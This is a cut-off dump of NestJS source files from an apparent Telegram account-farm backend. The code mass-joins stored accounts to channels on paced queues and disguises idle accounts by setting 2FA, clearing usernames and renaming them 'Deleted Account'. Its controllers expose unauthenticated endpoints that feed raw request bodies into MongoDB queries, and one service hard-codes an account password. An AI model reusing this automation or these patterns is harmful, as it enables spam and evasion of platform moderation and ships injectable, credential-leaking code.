forbidden: boolean\n}\n\nexport const ActiveChannelSchema = SchemaFactory.createForClass(ActiveChannel);\n","import { Controller, Get, Post, Body, Param, Delete, Query, Patch } from '@nestjs/common';\nimport { ApiTags, ApiOperation, ApiBody } from '@nestjs/swagger';\nimport { Client } from '../clients/schemas/client.schema';\nimport { ArchivedClientService } from './archived-client.service';\nimport { CreateClientDto } from '../clients/dto/create-client.dto';\nimport { SearchClientDto } from '../clients/dto/search-client.dto';\nimport { UpdateClientDto } from '../clients/dto/update-client.dto';\n\n@ApiTags('Archived Clients')\n@Controller('archived-clients')\nexport class ArchivedClientController {\n  constructor(private readonly archivedclientService: ArchivedClientService) { }\n\n  @Post()\n  @ApiOperation({ summary: 'Create user data' })\n  //@apiresponse({ status: 201, description: 'The user data has been successfully created.' })\n  //@apiresponse({ status: 403, description: 'Forbidden.' })\n  async create(@Body() createClientDto: CreateClientDto): Promise<Client> {\n    return this.archivedclientService.create(createClientDto);\n  }\n\n  @Get('search')\n  @ApiOperation({ summary: 'Search user data' })\n  //@apiresponse({ status: 200, description: 'Return the searched user data.' })\n  async search(@Query() query: SearchClientDto): Promise<Client[]> {\n    return this.archivedclientService.search(query);\n  }\n\n  @Get()\n  @ApiOperation({ summary: 'Get all user data' })\n  //@apiresponse({ status: 200, description: 'Return all user data.' })\n  //@apiresponse({ status: 403, description: 'Forbidden.' })\n  async findAll(): Promise<Client[]> {\n    return this.archivedclientService.findAll();\n  }\n  \n  @Get('checkArchivedClients')\n  @ApiOperation({ summary: 'Get user data by ID' })\n  //@apiresponse({ status: 200, description: 'Return the user data.' })\n  //@apiresponse({ status: 404, description: 'User data not found.' })\n  async checkArchivedClients(): Promise<string> {\n    return this.archivedclientService.checkArchivedClients();\n  }\n\n  @Get(':mobile')\n  @ApiOperation({ summary: 'Get user data by ID' })\n  //@apiresponse({ status: 200, description: 'Return the user data.' })\n  //@apiresponse({ status: 404, description: 'User data not found.' })\n  async findOne(@Param('mobile') mobile: string): Promise<Client> {\n    return this.archivedclientService.findOne(mobile);\n  }\n  \n  @Get('fetchOne/:mobile')\n  @ApiOperation({ summary: 'Get user data by ID' })\n  //@apiresponse({ status: 200, description: 'Return the user data.' })\n  //@apiresponse({ status: 404, description: 'User data not found.' })\n  async fetchOne(@Param('mobile') mobile: string): Promise<Client> {\n    return this.archivedclientService.fetchOne(mobile);\n  }\n\n  @Patch(':mobile')\n  @ApiOperation({ summary: 'Update user data by ID' })\n  //@apiresponse({ status: 200, description: 'The user data has been successfully updated.' })\n  //@apiresponse({ status: 404, description: 'User data not found.' })\n  async update(@Param('mobile') mobile: string, @Body() updateClientDto: UpdateClientDto): Promise<Client> {\n    return this.archivedclientService.update(mobile, updateClientDto);\n  }\n\n  @Delete(':mobile')\n  @ApiOperation({ summary: 'Delete user data by ID' })\n  //@apiresponse({ status: 200, description: 'The user data has been successfully deleted.' })\n  //@apiresponse({ status: 404, description: 'User data not found.' })\n  async remove(@Param('mobile') mobile: string): Promise<Client> {\n    return this.archivedclientService.remove(mobile);\n  }\n\n  @Post('query')\n  @ApiOperation({ summary: 'Execute a custom MongoDB query' })\n  //@apiresponse({ status: 200, description: 'Query executed successfully.' })\n  //@apiresponse({ status: 400, description: 'Invalid query.' })\n  //@apiresponse({ status: 500, description: 'Internal server error.' })\n  @ApiBody({type: Object})\n  async executeQuery(@Body() query: object): Promise<any> {\n    try {\n      return await this.archivedclientService.executeQuery(query);\n    } catch (error) {\n      throw error;  // You might want to handle errors more gracefully\n    }\n  }\n}\n","import { Module, forwardRef } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { ClientSchema } from '../clients/schemas/client.schema';\nimport { TelegramModule } from '../Telegram/Telegram.module';\nimport { ArchivedClientService } from './archived-client.service';\nimport { ArchivedClientController } from './archived-client.controller';\nimport { initModule } from '../ConfigurationInit/init.module';\nimport { ClientModule } from '../clients/client.module';\n\n@Module({\n  imports: [\n    initModule,\n    MongooseModule.forFeature([{ collection: 'ArchivedClients', name: 'ArchivedArchivedClientsModule', schema: ClientSchema }]),\n    forwardRef(() => TelegramModule),\n    forwardRef(() => ClientModule)\n  ],\n  controllers: [ArchivedClientController],\n  providers: [ArchivedClientService],\n  exports: [ArchivedClientService]\n})\nexport class ArchivedClientModule { }\n","import { BadRequestException, Inject, Injectable, InternalServerErrorException, NotFoundException, forwardRef } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { CreateClientDto } from '../clients/dto/create-client.dto';\nimport { Client, ClientDocument } from '../clients/schemas/client.schema';\nimport { UpdateClientDto } from '../clients/dto/update-client.dto';\nimport { TelegramService } from '../Telegram/Telegram.service';\nimport { sleep } from 'telegram/Helpers';\nimport { ClientService } from '../clients/client.service';\nimport { parseError } from '../../utils/parseError';\n@Injectable()\nexport class ArchivedClientService {\n    constructor(@InjectModel('ArchivedArchivedClientsModule') private archivedclientModel: Model<ClientDocument>,\n        @Inject(forwardRef(() => TelegramService))\n        private telegramService: TelegramService,\n        @Inject(forwardRef(() => ClientService))\n        private clientService: ClientService,\n    ) { }\n\n    async create(createClientDto: CreateClientDto): Promise<Client> {\n        const createdUser = new this.archivedclientModel(createClientDto);\n        return createdUser.save();\n    }\n\n    async findAll(): Promise<Client[]> {\n        const results: Client[] = await this.archivedclientModel.find().exec();\n        return results\n    }\n\n    async findOne(mobile: string): Promise<Client> {\n        const user = (await this.archivedclientModel.findOne({ mobile }).exec())?.toJSON();\n        return user;\n    }\n\n    async fetchOne(mobile: string): Promise<Client> {\n        const user = (await this.archivedclientModel.findOne({ mobile }).exec())?.toJSON();\n        if (user) {\n            return user;\n        } else {\n            try {\n                await this.telegramService.createClient(mobile, false, true)\n                const newSession = await this.telegramService.createNewSession(mobile);\n                await this.telegramService.deleteClient(mobile)\n                return await this.create({\n                    \"channelLink\": \"default\",\n                    \"clientId\": \"default\",\n                    \"dbcoll\": \"default\",\n                    \"deployKey\": \"default\",\n                    \"link\": \"default\",\n                    \"mainAccount\": \"default\",\n                    promoteRepl: \"default\",\n                    \"name\": \"default\",\n                    \"password\": \"Ajtdmwajt1@\",\n                    \"repl\": \"default\",\n                    \"session\": newSession,\n                    \"username\": \"default\",\n                    \"mobile\": mobile,\n                    product: \"default\"\n                })\n            } catch (e) {\n                await this.telegramService.deleteClient(mobile)\n                throw new NotFoundException(parseError(e).message);\n            }\n        }\n    }\n\n    async update(mobile: string, updateClientDto: UpdateClientDto): Promise<Client> {\n        delete updateClientDto[\"_id\"]\n        if ((<any>updateClientDto)._doc) {\n            delete (<any>updateClientDto)._doc['_id']\n        }\n        console.log({ ...updateClientDto });\n        const updatedUser = await this.archivedclientModel.findOneAndUpdate({ mobile }, { $set: updateClientDto }, { new: true, upsert: true }).exec();\n        return updatedUser;\n    }\n\n    async remove(mobile: string): Promise<Client> {\n        const deletedUser = await this.archivedclientModel.findOneAndDelete({ mobile }).exec();\n        if (!deletedUser) {\n            throw new NotFoundException(`Client with ID \"${mobile}\" not found`);\n        }\n        return deletedUser;\n    }\n\n    async search(filter: any): Promise<Client[]> {\n        console.log(filter)\n        if (filter.firstName) {\n            filter.firstName = { $regex: new RegExp(filter.firstName, 'i') }\n        }\n        console.log(filter)\n        return this.archivedclientModel.find(filter).exec();\n    }\n\n    async checkArchivedClients() {\n        await this.telegramService.disconnectAll()\n        await sleep(2000);\n        const archivedClients = await this.findAll();\n\n        const clients = await this.clientService.findAll();\n        const clientIds = clients.map(client => client.mobile);\n\n        archivedClients.map(async (document) => {\n            if (!clientIds.includes(document.mobile)) {\n                try {\n                    await this.telegramService.createClient(document.mobile, true, false);\n                    await this.telegramService.updateUsername(document.mobile, '');\n                    await this.telegramService.updateNameandBio(document.mobile, 'Deleted Account', '');\n                    await this.telegramService.deleteClient(document.mobile)\n                    await sleep(2000);\n                } catch (error) {\n                    console.log(document.mobile, \" :  false\");\n                    this.remove(document.mobile)\n                    await this.telegramService.deleteClient(document.mobile)\n                }\n            } else {\n                console.log(\"Number is a Active Client\")\n            }\n        })\n\n        return \"Triggered ArchiveClients check\"\n    }\n\n    async executeQuery(query: any): Promise<any> {\n        try {\n            if (!query) {\n                throw new BadRequestException('Query is invalid.');\n            }\n            return await this.archivedclientModel.find(query).exec();\n        } catch (error) {\n            throw new InternalServerErrorException(error.message);\n        }\n    }\n}\n","import { Controller, Get, Post, Body, Param, Delete, Query, Patch, Put } from '@nestjs/common';\nimport { ApiTags, ApiOperation, ApiBody, ApiParam } from '@nestjs/swagger';\nimport { BufferClientService } from './buffer-client.service';\nimport { CreateBufferClientDto } from './dto/create-buffer-client.dto';\nimport { SearchBufferClientDto } from './dto/search-buffer- client.dto';\nimport { BufferClient } from './schemas/buffer-client.schema';\nimport { UpdateBufferClientDto } from './dto/update-buffer-client.dto';\n\n@ApiTags('Buffer Clients')\n@Controller('bufferclients')\nexport class BufferClientController {\n  constructor(private readonly clientService: BufferClientService) { }\n\n  @Post()\n  @ApiOperation({ summary: 'Create user data' })\n  async create(@Body() createClientDto: CreateBufferClientDto): Promise<BufferClient> {\n    return this.clientService.create(createClientDto);\n  }\n\n  @Get('search')\n  @ApiOperation({ summary: 'Search user data' })\n  async search(@Query() query: SearchBufferClientDto): Promise<BufferClient[]> {\n    return this.clientService.search(query);\n  }\n\n  @Get('joinChannelsForBufferClients')\n  @ApiOperation({ summary: 'Join Channels for BufferClients' })\n  async joinChannelsforBufferClients(): Promise<string> {\n    return this.clientService.joinchannelForBufferClients();\n  }\n\n  @Get('checkBufferClients')\n  @ApiOperation({ summary: 'Check Buffer Clients' })\n  async checkbufferClients(): Promise<string> {\n    this.clientService.checkBufferClients();\n    return \"initiated Checking\"\n  }\n\n  @Post('addNewUserstoBufferClients')\n  @ApiOperation({ summary: 'Add New Users to Buffer Clients' })\n  @ApiBody({ type: Object })\n  async addNewUserstoBufferClients(@Body() body: { goodIds: string[], badIds: string[] }): Promise<string> {\n    this.clientService.addNewUserstoBufferClients(body.badIds, body.goodIds);\n    return \"initiated Checking\"\n  }\n\n  @Get()\n  @ApiOperation({ summary: 'Get all user data' })\n  async findAll(): Promise<BufferClient[]> {\n    return this.clientService.findAll();\n  }\n\n  @Get('SetAsBufferClient/:mobile')\n  @ApiOperation({ summary: 'Set as Buffer Client' })\n  @ApiParam({ name: 'mobile', description: 'User mobile number', type: String })\n  async setAsBufferClient(\n    @Param('mobile') mobile: string,\n  ) {\n    return await this.clientService.setAsBufferClient(mobile);\n  }\n\n  @Get(':mobile')\n  @ApiOperation({ summary: 'Get user data by ID' })\n  async findOne(@Param('mobile') mobile: string): Promise<BufferClient> {\n    return this.clientService.findOne(mobile);\n  }\n\n  @Patch(':mobile')\n  @ApiOperation({ summary: 'Update user data by ID' })\n  async update(@Param('mobile') mobile: string, @Body() updateClientDto: UpdateBufferClientDto): Promise<BufferClient> {\n    return this.clientService.update(mobile, updateClientDto);\n  }\n\n  @Put(':mobile')\n  @ApiOperation({ summary: 'Update user data by ID' })\n  async createdOrupdate(@Param('mobile') mobile: string, @Body() updateClientDto: UpdateBufferClientDto): Promise<BufferClient> {\n    return this.clientService.createOrUpdate(mobile, updateClientDto);\n  }\n\n  @Delete(':mobile')\n  @ApiOperation({ summary: 'Delete user data by ID' })\n  async remove(@Param('mobile') mobile: string): Promise<void> {\n    return this.clientService.remove(mobile);\n  }\n\n  @Post('query')\n  @ApiOperation({ summary: 'Execute a custom MongoDB query' })\n  @ApiBody({ type: Object })\n  async executeQuery(@Body() query: object): Promise<any> {\n    try {\n      return await this.clientService.executeQuery(query);\n    } catch (error) {\n      throw error;  // You might want to handle errors more gracefully\n    }\n  }\n\n}\n","import { Module, forwardRef } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { BufferClientService } from './buffer-client.service';\nimport { BufferClientController } from './buffer-client.controller';\nimport { BufferClientSchema } from './schemas/buffer-client.schema';\nimport { TelegramModule } from '../Telegram/Telegram.module';\nimport { ActiveChannelsModule } from '../active-channels/active-channels.module';\nimport { UsersModule } from '../users/users.module';\nimport { ClientModule } from '../clients/client.module';\nimport { initModule } from '../ConfigurationInit/init.module';\nimport { ChannelsModule } from '../channels/channels.module';\nimport { PromoteClientModule } from '../promote-clients/promote-client.module';\n\n@Module({\n  imports: [\n    initModule,\n    MongooseModule.forFeature([{ name: 'bufferClientModule', schema: BufferClientSchema, collection: 'bufferClients' }]),\n    forwardRef(() => TelegramModule),\n    forwardRef(() => UsersModule),\n    forwardRef(() => ActiveChannelsModule),\n    forwardRef(() => ClientModule),\n    forwardRef(() => ChannelsModule),\n    forwardRef(() => PromoteClientModule)\n ],\n  controllers: [BufferClientController],\n  providers: [BufferClientService],\n  exports: [BufferClientService]\n})\nexport class BufferClientModule { }\n","import { ChannelsService } from './../channels/channels.service';\nimport { Channel } from './../channels/schemas/channel.schema';\nimport { BadRequestException, ConflictException, HttpException, Inject, Injectable, InternalServerErrorException, Logger, NotFoundException, forwardRef } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { CreateBufferClientDto } from './dto/create-buffer-client.dto';\nimport { BufferClient, BufferClientDocument } from './schemas/buffer-client.schema';\nimport { TelegramService } from '../Telegram/Telegram.service';\nimport { sleep } from 'telegram/Helpers';\nimport { UsersService } from '../users/users.service';\nimport { ActiveChannelsService } from '../active-channels/active-channels.service';\nimport { ClientService } from '../clients/client.service';\nimport { UpdateBufferClientDto } from './dto/update-buffer-client.dto';\nimport { PromoteClientService } from '../promote-clients/promote-client.service';\nimport { parseError } from '../../utils/parseError';\nimport { fetchWithTimeout } from '../../utils/fetchWithTimeout';\nimport { notifbot } from '../../utils/logbots';\n\n@Injectable()\nexport class BufferClientService {\n    private readonly logger = new Logger(BufferClientService.name);\n    private joinChannelMap: Map<string, Channel[]> = new Map();\n    private joinChannelIntervalId: NodeJS.Timeout;\n    private leaveChannelMap: Map<string, string[]> = new Map();\n    private leaveChannelIntervalId: NodeJS.Timeout;\n    private isJoinChannelProcessing: boolean = false;\n    private isLeaveChannelProcessing: boolean = false;\n    private readonly JOIN_CHANNEL_INTERVAL = 4 * 60 * 1000; // 4 minutes\n    private readonly LEAVE_CHANNEL_INTERVAL = 60 * 1000; // 30 seconds\n    private readonly LEAVE_CHANNEL_BATCH_SIZE = 10;\n\n    constructor(@InjectModel('bufferClientModule') private bufferClientModel: Model<BufferClientDocument>,\n        @Inject(forwardRef(() => TelegramService))\n        private telegramService: TelegramService,\n        @Inject(forwardRef(() => UsersService))\n        private usersService: UsersService,\n        @Inject(forwardRef(() => ActiveChannelsService))\n        private activeChannelsService: ActiveChannelsService,\n        @Inject(forwardRef(() => ClientService))\n        private clientService: ClientService,\n        @Inject(forwardRef(() => ActiveChannelsService))\n        private channelsService: ChannelsService,\n        @Inject(forwardRef(() => PromoteClientService))\n        private promoteClientService: PromoteClientService,\n    ) {}\n\n    async create(bufferClient: CreateBufferClientDto): Promise<BufferClient> {\n        const newUser = new this.bufferClientModel(bufferClient);\n        return newUser.save();\n    }\n\n    async findAll(): Promise<BufferClient[]> {\n        return this.bufferClientModel.find().exec();\n    }\n\n    async findOne(mobile: string, throwErr: boolean = true): Promise<BufferClient> {\n        const user = (await this.bufferClientModel.findOne({ mobile }).exec())?.toJSON();\n        if (!user && throwErr) {\n            throw new NotFoundException(`BufferClient with mobile ${mobile} not found`);\n        }\n        return user;\n    }\n\n\n    async update(mobile: string, updateClientDto: UpdateBufferClientDto): Promise<BufferClient> {\n        const updatedUser = await this.bufferClientModel.findOneAndUpdate(\n            { mobile },\n            { $set: updateClientDto },\n            { new: true, upsert: true, returnDocument: 'after' }\n        ).exec();\n\n        if (!updatedUser) {\n            throw new NotFoundException(`User with mobile ${mobile} not found`);\n        }\n\n        return updatedUser;\n    }\n\n    async createOrUpdate(mobile: string, createOrUpdateUserDto: CreateBufferClientDto | UpdateBufferClientDto): Promise<BufferClient> {\n        const existingUser = (await this.bufferClientModel.findOne({ mobile }).exec())?.toJSON();\n        if (existingUser) {\n            console.log(\"Updating\")\n            return this.update(existingUser.mobile, createOrUpdateUserDto as UpdateBufferClientDto);\n        } else {\n            console.log(\"creating\")\n            return this.create(createOrUpdateUserDto as CreateBufferClientDto);\n        }\n    }\n\n    async remove(mobile: string): Promise<void> {\n        await fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`Deleting Buffer Client : ${mobile}`)}`);\n        const result = await this.bufferClientModel.deleteOne({ mobile }).exec();\n        if (result.deletedCount === 0) {\n            throw new NotFoundException(`BufferClient with mobile ${mobile} not found`);\n        }\n    }\n    async search(filter: any): Promise<BufferClient[]> {\n        console.log(filter)\n        if (filter.firstName) {\n            filter.firstName = { $regex: new RegExp(filter.firstName, 'i') }\n        }\n        console.log(filter)\n        return this.bufferClientModel.find(filter).exec();\n    }\n\n    async executeQuery(query: any, sort?: any, limit?: number, skip?: number): Promise<BufferClient[]> {\n        try {\n\n            if (!query) {\n                throw new BadRequestException('Query is invalid.');\n            }\n            const queryExec = this.bufferClientModel.find(query);\n            if (sort) {\n                queryExec.sort(sort);\n            }\n\n            if (limit) {\n                queryExec.limit(limit);\n            }\n\n            if (skip) {\n                queryExec.skip(skip);\n            }\n\n            return await queryExec.exec();\n        } catch (error) {\n            throw new InternalServerErrorException(error.message);\n        }\n    }\n\n    removeFromBufferMap(key: string) {\n        this.joinChannelMap.delete(key);\n    }\n\n    clearBufferMap() {\n        console.log(\"BufferMap cleared\");\n        this.joinChannelMap.clear();\n        this.clearJoinChannelInterval();\n    }\n\n    async joinchannelForBufferClients(skipExisting: boolean = true): Promise<string> {\n        if (!this.telegramService.getActiveClientSetup()) {\n            this.logger.log('Starting join channel process');\n            await this.telegramService.disconnectAll();\n            \n            // Clear both queues before starting new process\n            this.clearJoinChannelInterval();\n            this.clearLeaveChannelInterval();\n            \n            await sleep(2000);\n            const existingkeys = skipExisting ? [] : Array.from(this.joinChannelMap.keys())\n            const clients = await this.bufferClientModel.find({ channels: { \"$lt\": 350 }, mobile: { $nin: existingkeys } }).sort({ channels: 1 }).limit(4);\n            \n            this.logger.debug(`Found ${clients.length} clients to process for joining channels`);\n            \n            if (clients.length > 0) {\n                for (const document of clients) {\n                    try {\n                        const client = await this.telegramService.createClient(document.mobile, false, false);\n                        this.logger.log(`Started joining process for mobile: ${document.mobile}`);\n                        \n                        const channels = await client.channelInfo(true);\n                        this.logger.debug(`Client ${document.mobile} has ${channels.ids.length} existing channels`);\n                        \n                        await this.update(document.mobile, { channels: channels.ids.length });\n                        this.logger.debug(`Client ${document.mobile} has ${channels.canSendFalseChats.length} channels that can't send messages`);\n                        \n                        let result = [];\n                        if (channels.canSendFalseCount < 10) {\n                            if (channels.ids.length < 220) {\n                                result = await this.channelsService.getActiveChannels(150, 0, channels.ids);\n                            } else {\n                                result = await this.activeChannelsService.getActiveChannels(150, 0, channels.ids);\n                            }\n                            this.logger.debug(`Adding ${result.length} new channels to join queue for ${document.mobile}`);\n                            this.joinChannelMap.set(document.mobile, result);\n                            this.joinChannelQueue();\n                            await this.telegramService.deleteClient(document.mobile);\n                        } else {\n                            this.logger.warn(`Client ${document.mobile} has too many restricted channels, moving to leave queue: ${channels.canSendFalseChats.length}`);\n                            this.joinChannelMap.delete(document.mobile);\n                            this.leaveChannelMap.set(document.mobile, channels.canSendFalseChats);\n                            this.leaveChannelQueue();\n                            await this.telegramService.deleteClient(document.mobile);\n\n                        }\n                        // console.log(\"DbChannelsLen: \", result.length);\n                        // let resp = '';\n                        // this.telegramService.joinChannels(document.mobile, result);\n                    } catch (error) {\n                        if (error.message === \"SESSION_REVOKED\" ||\n                            error.message === \"AUTH_KEY_UNREGISTERED\" ||\n                            error.message === \"USER_DEACTIVATED\" ||\n                            error.message === \"USER_DEACTIVATED_BAN\") {\n                            this.logger.error(`Session invalid for ${document.mobile}, removing client`, error.stack);\n                            await this.remove(document.mobile);\n                            await this.telegramService.deleteClient(document.mobile);\n                        }\n                        parseError(error)\n                    }\n                }\n            }\n            this.logger.log(`Join channel process initiated for ${clients.length} clients`);\n            return `Initiated Joining channels ${clients.length}`\n        } else {\n            this.logger.warn('Ignored active check buffer channels as active client setup exists');\n        }\n    }\n\n    async joinChannelQueue() {\n        if (this.isJoinChannelProcessing || this.joinChannelIntervalId) {\n            this.logger.warn('Join channel process is already running, instance:', this.joinChannelIntervalId);\n            return;\n        }\n\n        const existingKeys = Array.from(this.joinChannelMap.keys());\n        if (existingKeys.length === 0) {\n            this.logger.debug('No channels to join, not starting queue');\n            return;\n        }\n\n        this.isJoinChannelProcessing = true;\n        this.joinChannelIntervalId = setInterval(async () => {\n            try {\n                const keys = Array.from(this.joinChannelMap.keys());\n                if (keys.length === 0) {\n                    this.clearJoinChannelInterval();\n                    return;\n                }\n\n                // Add timeout to prevent infinite processing\n                const processTimeout = setTimeout(() => {\n                    this.logger.error('Join channel interval processing timeout');\n                    this.clearJoinChannelInterval();\n                }, this.JOIN_CHANNEL_INTERVAL - 1000);\n\n                this.logger.debug(`Processing join channel queue at ${new Date().toISOString()}, ${keys.length} clients remaining, interval:${this.joinChannelIntervalId}`);\n\n                for (const mobile of keys) {\n                    const channels = this.joinChannelMap.get(mobile);\n                    if (!channels || channels.length === 0) {\n                        this.logger.debug(`No more channels to join for ${mobile}, removing from queue`);\n                        this.removeFromBufferMap(mobile);\n                        continue;\n                    }\n\n                    const channel = channels.shift();\n                    this.logger.debug(`${mobile} has ${channels.length} pending channels to join`);\n                    this.joinChannelMap.set(mobile, channels);\n\n                    try {\n                        await this.telegramService.createClient(mobile, false, false);\n                        this.logger.debug(`${mobile} attempting to join channel: @${channel.username}`);\n                        await this.telegramService.tryJoiningChannel(mobile, channel);\n                    } catch (error) {\n                        const errorDetails = parseError(error, `${mobile} @${channel.username} Outer Err ERR: `, false);\n                        this.logger.error(`Error joining channel @${channel.username} for ${mobile}`, errorDetails);\n\n                        if (errorDetails.error === 'FloodWaitError' || error.errorMessage === 'CHANNELS_TOO_MUCH') {\n                            this.logger.warn(`${mobile} has FloodWaitError or joined too many channels, removing from queue`);\n                            this.removeFromBufferMap(mobile);\n                            const channelsInfo = await this.telegramService.getChannelInfo(mobile, true);\n                            await this.update(mobile, { channels: channelsInfo.ids.length });\n                        }\n\n                        if (error.errorMessage === \"SESSION_REVOKED\" ||\n                            error.errorMessage === \"AUTH_KEY_UNREGISTERED\" ||\n                            error.errorMessage === \"USER_DEACTIVATED\" ||\n                            error.errorMessage === \"USER_DEACTIVATED_BAN\") {\n                            this.logger.error(`Session invalid for ${mobile}, removing client`);\n                            await this.remove(mobile);\n                        }\n                    } finally {\n                        await this.telegramService.deleteClient(mobile);\n                    }\n                }\n\n                clearTimeout(processTimeout);\n            } catch (error) {\n                this.logger.error('Error in join channel interval', error.stack);\n                this.clearJoinChannelInterval();\n            }\n        }, this.JOIN_CHANNEL_INTERVAL);\n        \n        this.logger.debug(`Started join channel queue with interval ID: ${this.joinChannelIntervalId}`);\n    }\n\n    clearJoinChannelInterval() {\n        if (this.joinChannelIntervalId) {\n            this.logger.debug(`Clearing join channel interval: ${this.joinChannelIntervalId}`);\n            clearInterval(this.joinChannelIntervalId);\n            this.joinChannelIntervalId = null;\n            this.isJoinChannelProcessing = false;\n            \n            // Only schedule next run if there are items in the map\n            if (this.joinChannelMap.size > 0) {\n                setTimeout(() => {\n                    this.logger.debug('Triggering next join channel process');\n                    this.joinchannelForBufferClients(false);\n                }, 30000);\n            }\n        }\n    }\n\n    removeFromLeaveMap(key: string) {\n        this.leaveChannelMap.delete(key);\n        if (this.leaveChannelMap.size === 0) {\n            this.clearLeaveChannelInterval();\n        }\n    }\n\n    clearLeaveMap() {\n        console.log(\"LeaveMap cleared\");\n        this.leaveChannelMap.clear();\n        this.clearLeaveChannelInterval();\n    }\n\n    async leaveChannelQueue() {\n        if (this.isLeaveChannelProcessing || this.leaveChannelIntervalId) {\n            this.logger.warn('Leave channel process is already running, instance:', this.leaveChannelIntervalId);\n            return;\n        }\n\n        const existingKeys = Array.from(this.leaveChannelMap.keys());\n        if (existingKeys.length === 0) {\n            this.logger.debug('No channels to leave, not starting queue');\n            return;\n        }\n\n        this.isLeaveChannelProcessing = true;\n        this.leaveChannelIntervalId = setInterval(async () => {\n            try {\n                const keys = Array.from(this.leaveChannelMap.keys());\n                if (keys.length === 0) {\n                    this.logger.debug('Leave map is empty, clearing interval');\n                    this.clearLeaveChannelInterval();\n                    return;\n                }\n\n                // Add timeout to prevent infinite processing\n                const processTimeout = setTimeout(() => {\n                    this.logger.error('Leave channel interval processing timeout');\n                    this.clearLeaveChannelInterval();\n                }, this.LEAVE_CHANNEL_INTERVAL - 1000);\n\n                this.logger.debug(`Processing leave channel queue at ${new Date().toISOString()}, ${keys.length} clients remaining, interval:${this.leaveChannelIntervalId}`);\n\n                for (const mobile of keys) {\n                    const channels = this.leaveChannelMap.get(mobile);\n                    if (!channels || channels.length === 0) {\n                        this.logger.debug(`No more channels to leave for ${mobile}, removing from queue`);\n                        this.removeFromLeaveMap(mobile);\n                        continue;\n                    }\n\n                    const channelsToProcess = channels.splice(0, this.LEAVE_CHANNEL_BATCH_SIZE);\n                    this.logger.debug(`${mobile} has ${channels.length} pending channels to leave`);\n                    \n                    // Only update map if there are remaining channels\n                    if (channels.length > 0) {\n                        this.leaveChannelMap.set(mobile, channels);\n                    } else {\n                        this.removeFromLeaveMap(mobile);\n                    }\n\n                    try {\n                        const client = await this.telegramService.createClient(mobile, false, false);\n                        this.logger.debug(`${mobile} attempting to leave ${channelsToProcess.length} channels`);\n                        await client.leaveChannels(channelsToProcess);\n                        this.logger.debug(`${mobile} left channels successfully`);\n                    } catch (error) {\n                        const errorDetails = parseError(error, `${mobile} Leave Channel ERR: `, false);\n                        if (\n                            errorDetails.message === \"SESSION_REVOKED\" ||\n                            errorDetails.message === \"AUTH_KEY_UNREGISTERED\" ||\n                            errorDetails.message === \"USER_DEACTIVATED\" ||\n                            errorDetails.message === \"USER_DEACTIVATED_BAN\"\n                        ) {\n                            this.logger.error(`Session invalid for ${mobile}, removing client`);\n                            await this.remove(mobile);\n                            this.removeFromLeaveMap(mobile);\n                        }\n                    } finally {\n                        await this.telegramService.deleteClient(mobile);\n                    }\n                }\n\n                clearTimeout(processTimeout);\n            } catch (error) {\n                this.logger.error('Error in leave channel interval', error.stack);\n                this.clearLeaveChannelInterval();\n            }\n        }, this.LEAVE_CHANNEL_INTERVAL);\n        \n        this.logger.debug(`Started leave channel queue with interval ID: ${this.leaveChannelIntervalId}`);\n    }\n\n    clearLeaveChannelInterval() {\n        if (this.leaveChannelIntervalId) {\n            this.logger.debug(`Clearing leave channel interval: ${this.leaveChannelIntervalId}`);\n            clearInterval(this.leaveChannelIntervalId);\n            this.leaveChannelIntervalId = null;\n        }\n        this.isLeaveChannelProcessing = false;\n        this.logger.debug('Leave channel interval cleared and processing flag reset');\n    }\n\n    async setAsBufferClient(\n        mobile: string,\n        availableDate: string = (new Date(Date.now() - (24 * 60 * 60 * 1000))).toISOString().split('T')[0]\n    ) {\n        const user = (await this.usersService.search({ mobile }))[0];\n        if (!user) {\n            throw new BadRequestException('user not found');\n        }\n        const isExist = await this.findOne(mobile, false)\n        if (isExist) {\n            throw new ConflictException('BufferClient already exist');\n        }\n        const clients = await this.clientService.findAll();\n        const clientMobiles = clients.map(client => client?.mobile);\n        const clientPromoteMobiles = clients.flatMap(client => client?.promoteMobile);\n        if (!clientPromoteMobiles.includes(mobile) && !clientMobiles.includes(mobile)) {\n            try {\n                const telegramClient = await this.telegramService.createClient(mobile, false)\n                await telegramClient.set2fa();\n                await sleep(15000)\n                await telegramClient.updateUsername('');\n                await sleep(3000)\n                await telegramClient.updatePrivacyforDeletedAccount();\n                await sleep(3000)\n                await telegramClient.updateProfile(\"Deleted Account\", \"Deleted Account\");\n                // await sleep(3000)\n                // await telegramClient.deleteProfilePhotos();\n                // const channels = await this.telegramService.getChannelInfo(mobile, true)\n                // const bufferClient = {\n                //     tgId: user.tgId,\n                //     session: user.session,\n                //     mobile: user.mobile,\n                //     availableDate,\n                //     channels: channels.ids.length,\n                // }\n                // await this.bufferClientModel.findOneAndUpdate({ tgId: user.tgId }, { $set: bufferClient }, { new: true, upsert: true }).exec();\n            } catch (error) {\n                const errorDetails = parseError(error)\n                throw new HttpException(errorDetails.message, errorDetails.status)\n            }\n            await this.telegramService.deleteClient(mobile)\n            return \"Client set as buffer successfully\";\n        } else {\n            throw new BadRequestException(\"Number is a Active Client\")\n        }\n    }\n\n    async checkBufferClients() {\n        if (!this.telegramService.getActiveClientSetup()) {\n            await this.telegramService.disconnectAll()\n            await sleep(2000);\n            const bufferclients = await this.findAll();\n            let goodIds: string[] = [];\n            const badIds: string[] = [];\n            if (bufferclients.length < 70) {\n                for (let i = 0; i < 70 - bufferclients.length; i++) {\n                    badIds.push(i.toString())\n                }\n            }\n            const clients = await this.clientService.findAll();\n            const promoteclients = await this.promoteClientService.findAll();\n            const clientIds = [...clients.map(client => client.mobile), ...clients.flatMap(client => { return (client.promoteMobile) })]\n            const promoteclientIds = promoteclients.map(client => client.mobile);\n            const today = (new Date(Date.now())).toISOString().split('T')[0];\n            for (const document of bufferclients) {\n                if (!clientIds.includes(document.mobile) && !promoteclientIds.includes(document.mobile)) {\n                    try {\n                        const cli = await this.telegramService.createClient(document.mobile, true, false);\n                        const me = await cli.getMe();\n                        if (me.username) {\n                            await this.telegramService.updateUsername(document.mobile, '');\n                            await sleep(2000)\n                        }\n                        if (me.firstName !== \"Deleted Account\") {\n                            await this.telegramService.updateNameandBio(document.mobile, 'Deleted Account', '');\n                            // await this.telegramService.updatePrivacyforDeletedAccount(document.mobile);\n             